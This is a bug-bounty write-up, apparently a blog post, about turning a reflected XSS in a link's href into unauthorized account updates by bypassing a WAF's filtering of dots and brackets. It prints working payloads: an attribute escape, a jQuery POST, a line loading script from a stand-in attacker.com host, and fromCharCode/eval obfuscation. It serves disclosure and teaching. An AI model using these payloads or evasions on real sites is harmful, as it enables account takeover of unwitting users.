---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-10-14_weaponizing-xss-for-fun-profit.md
original_filename: 2020-10-14_weaponizing-xss-for-fun-profit.md
title: Weaponizing XSS For Fun & Profit
category: documents
detected_topics:
- xss
- command-injection
- otp
- csrf
tags:
- imported
- documents
- xss
- command-injection
- otp
- csrf
language: en
raw_sha256: b5d1661cf237a4ec61a088d928e78e57efa6c873c5b1578aa49a7cda7dcddd23
text_sha256: 5d1b1af6e1f3ab6dce4fff7b7b01cd063788b5dfe5c68ca2feeb301e74dd8b37
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Weaponizing XSS For Fun & Profit

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-10-14_weaponizing-xss-for-fun-profit.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, csrf
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `b5d1661cf237a4ec61a088d928e78e57efa6c873c5b1578aa49a7cda7dcddd23`
- Text SHA256: `5d1b1af6e1f3ab6dce4fff7b7b01cd063788b5dfe5c68ca2feeb301e74dd8b37`


## Content

---
title: "Weaponizing XSS For Fun & Profit"
url: "https://saadahmedx.medium.com/weaponizing-xss-for-fun-profit-a1414f3fcee9"
authors: ["Saad Ahmed (@XSaadAhmedX)"]
bugs: ["XSS", "CSRF"]
bounty: "2,200"
publication_date: "2020-10-14"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4196
scraped_via: "browseros"
---

# Weaponizing XSS For Fun & Profit

Weaponizing XSS For Fun & Profit
Saad Ahmed
Follow
4 min read
·
Oct 14, 2020

180

Hi Folks! hope you all doing good so I am back with another amazing way of bypassing the WAF which is blocking me from weaponizing the XSS, Without wasting any time let get started.

The XSS part is very simple my input is reflecting inside the HREF in <a> e.g <a href=”https://example.com/home/leet”>Home</a>

Escaping from href is very simple my payload leet” onmouseover=alert(1)” now when I move my mouse over the link the XSS is popup this is very simple & basic.

It’s time to do something BIG!!! Now I am checking all the endpoints of the WebApp that disclosing the sensitive information which I can steal from XSS and show to impact to the TEAM, so after checking all the request I came to know that on every request there is CSRF TOKEN header is present, so I need to steal that token and then need to send the request using fetch to weaponize the XSS.

I tried to remove the CSRF TOKEN from the request & bang!! the request is sent without any error & the Account information is UPDATED. But when i tried to reproduce this by creating the HTML FORM the server give 403 missing CSRF TOKEN, after checking the request the matching all the headers I came to know that the dev done some short work ( JUGAR ) to prevent from CSRF is by checking the REFERER HEADER. If the request comes from example.com then they accept it else they give 403 with missing CSRF TOKEN.

I already have XSS so don’t need to worry about the Referer ✌️Simple send the below JQUERY POST req from the console just to verifying it & it worked.

$.post(“https://example.com/account/update_info/",{name: “Account Update”},function(data,status){alert(“Data: “ + data + “\nStatus: “ + status);});

so my final payload that update the account information is.

leet” onmouseover=’$.post(`https://example.com/account/update_info/`,{name: `Account Update`},function(data,status){alert(`Data: ` + data + `Status: ` + status);});
‘“

The payload didn’t work. nowhere the SERVER is doing something bad the server is replacing the . with _ e.g example.com becomes example_com. I tried everything here encoding etc but didn’t work, so my mind clicked why not I simply call the JS file from the server but again I need to put my server URL which also contains the . & the document.createElement() is also contain .

Press enter or click to view image in full size

for those who dont know we can also used the document.createElement() without . like this document[‘createElement’](‘script’)

Press enter or click to view image in full size

so the final code that call the JSCODE from attacker server is

document[‘createElement’](‘script’);a[‘setAttribute’](‘src’,’attacker.com/x.js’);document[‘head’][‘appendChild’](a);

String[‘fromCharCode’](100,111,99,117,109,101,110,116,91,39,99,114,101,97,116,101,69,108,101,109,101,110,116,39,93,40,39,115,99,114,105,112,116,39,41,97,91,39,115,101,116,65,116,116,114,105,98,117,116,101,39,93,40,39,115,114,99,39,44,39,97,116,116,97,99,107,101,114,46,99,111,109,47,120,46,106,115,39,41,59,100,111,99,117,109,101,110,116,91,39,104,101,97,100,39,93,91,39,97,112,112,101,110,100,67,104,105,108,100,39,93,40,97,41)

convert the creating the script tag into charCode beacase the server contain .

Press enter or click to view image in full size

When I Execute this from XSS the server encoding the [ ]. So bypassing of . is useless 😠 I tried everything here bypassing the . & [ ] but nothing works. One of my friend told you can call script from SERVER without . & [ ] I was like tell me bruhh howww!!!

with(String){eval(fromCharCode(97,108,101,114,116,40,49,41))}

so we can use with and the return value of fromCharCode inside the eval to execute the string no need of . & [ ]

Press enter or click to view image in full size

The Final payload look like this

$.post(“https://example.com/account/update_info/",{name: “Account Update”},function(data,status){alert(“Data: “ + data + “\nStatus: “ + status);});

converted into charCode

Get Saad Ahmed’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

put he charCode value in the code look like this

with(String){eval(fromCharCode(36,46,112,111,115,116,40,34,104,116,116,112,115,58,47,47,109,105,120,112,97,110,101,108,46,99,111,109,47,97,99,99,111,117,110,116,47,117,112,100,97,116,101,95,110,97,109,101,47,34,44,123,101,109,97,105,108,58,32,34,115,104,103,51,51,107,64,103,109,97,105,108,46,99,111,109,34,125,44,102,117,110,99,116,105,111,110,40,100,97,116,97,44,115,116,97,116,117,115,41,123,99,111,110,115,111,108,101,46,108,111,103,40,34,68,97,116,97,58,32,34,32,43,32,100,97,116,97,32,43,32,34,92,110,83,116,97,116,117,115,58,32,34,32,43,32,115,116,97,116,117,115,41,59,125,41,59))}

Press enter or click to view image in full size

urlEncoded the above code and the final payload become

https://example.com/home/leet” onmouseover=’URLENCODED PAYLOAD’ “

send the above link to anyone & you can update his account, delete the account and many more action

The Program paid $400 for XSS and told me to submit new report for CSRF issue and they paid $1800 for CSRF and the TOTAL IS $2200

Press enter or click to view image in full size

This whole bypass and upgrading process done in 3 Days 🙌. I hope you guys learn something new here

./LOGOUT
